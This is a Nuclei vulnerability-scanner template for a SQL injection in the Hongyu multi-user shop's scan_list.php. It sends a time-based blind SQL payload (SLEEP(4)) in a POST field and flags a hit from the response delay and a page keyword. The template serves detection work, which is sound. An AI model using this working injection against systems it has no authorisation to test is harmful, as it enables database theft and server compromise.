id: hongyu-shop-sqli

info:
  name: 鸿宇多用户商城scan_list.php存在SQL注入
  author: ProjectDiscoveryAI
  severity: high
  description: |
    鸿宇多用户商城 scan_list.php 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%B8%BF%E5%AE%87%E7%A7%91%E6%8A%80/%E9%B8%BF%E5%AE%87%E5%A4%9A%E7%94%A8%E6%88%B7%E5%95%86%E5%9F%8Escan_list.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: 鸿宇-多用户商城

http:
  - raw:
      - |
        POST /scan_list.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        data['fahuo']=(SELECT 2753 FROM (SELECT(SLEEP(4)))QkUH)&act=view

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - duration >= 4
      - type: word
        words:
          - "智能扫货商品展示"